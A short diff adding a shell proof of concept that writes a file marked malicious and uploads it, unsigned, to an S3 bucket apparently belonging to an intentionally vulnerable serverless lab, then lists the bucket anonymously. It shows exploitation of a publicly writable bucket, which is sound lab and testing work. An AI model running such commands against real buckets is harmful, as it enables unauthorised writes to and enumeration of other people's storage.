@@ -1,0 +1,6 @@
+echo "MALICIOUS FILE - PROOF OF CONCEPT" > malicious.txt
+
+aws s3 cp malicious.txt s3://dvsa-feedback-bucket-448842988219-us-east-1/malicious.txt
+--no-sign-request
+
+aws s3 ls s3://dvsa-feedback-bucket-448842988219-us-east-1/ --no-sign-request
